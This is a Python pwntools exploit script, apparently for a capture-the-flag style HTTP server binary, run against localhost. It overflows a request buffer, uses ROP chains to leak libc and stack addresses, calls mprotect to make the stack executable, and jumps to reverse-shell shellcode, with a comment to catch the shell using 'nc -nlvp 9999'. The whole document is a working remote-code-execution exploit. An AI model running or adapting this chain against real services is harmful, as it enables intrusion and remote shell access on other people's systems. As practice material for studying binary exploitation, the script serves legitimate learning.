from pwn import *
import subprocess

# run `nc -nlvp 9999` to receive reverse shell connection


binpath = './server'
elf = ELF(binpath)
libc = ELF('./libc-2.31.so')

# context.log_level = 'DEBUG'

# kill server parent if it exists
# subprocess.run('pgrep -f ./server | xargs kill -9', shell=True)

gdbscript = '''
gef
# set follow-fork-mode child
set follow-fork-mode parent

# just before fork()
b *0x401402
commands
set follow-fork-mode child
b mprotect
c
end
ignore 1 2

# b accept

b http_saba

# return from http_saba (rop)
b *0x401814

c
'''
# gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
process(binpath)

io = remote('127.0.0.1', 9080)

REQUEST_MAX = 0x100
addr_pop_rdi = 0x0000000000401c93 #  : pop rdi ; ret
addr_pop_rsi = 0x0000000000401698 #  : pop rsi ; ret

def read_qword(io, addr):
    payload = b'A' * (REQUEST_MAX - 1)
    payload += b'\r'
    payload += b'B' * 0x38
    # rop
    # write(sock, addr, 0x8d) // no pop rdx gadget
    # rdi == sock when it returns from http_saba so no need to set rdi
    payload += p64(addr_pop_rsi)
    payload += p64(addr)
    payload += p64(elf.plt['write'])
    payload += b'\r\n\r\n'

    io.send(payload)
    io.recvuntil(b'</html>\n')
    data = io.recv(8)

    return data

data = read_qword(io, elf.got['write'])
libc.address = u64(data) - libc.symbols['write']
print('libc.address = 0x{:x}'.format(libc.address))

addr_pop_rdx_r12 = libc.address + 0x000000000011c371 #  : pop rdx ; pop r12 ; ret

io = remote('127.0.0.1', 9080)
environ = u64(read_qword(io, libc.symbols['environ']))
addr_payload_stack = environ - 0x298
print('addr_payload_stack = 0x{:x}'.format(addr_payload_stack))

# print('Press enter to continue...')
# input()

io = remote('127.0.0.1', 9080)
with open('./reverse_shell.bin', 'rb') as f:
    shellcode = f.read()
    assert(len(shellcode) < REQUEST_MAX - 1)
payload = b''
payload += shellcode
payload += b'C' * (REQUEST_MAX - 1 - len(payload))
payload += b'\r'
payload += b'D' * 0x38
# rop
# mprotect(addr_payload_stack & ~0xfff, 0x1000, 7)
payload += p64(addr_pop_rdi)
payload += p64(addr_payload_stack & ~0xfff)
payload += p64(addr_pop_rsi)
payload += p64(0x1000)
payload += p64(addr_pop_rdx_r12)
payload += p64(0x7)
payload += p64(0xdeadbeef)
payload += p64(libc.symbols['mprotect'])
# shellcode()
payload += p64(addr_payload_stack)
payload += b'\r\n\r\n'
io.send(payload)


io.interactive()
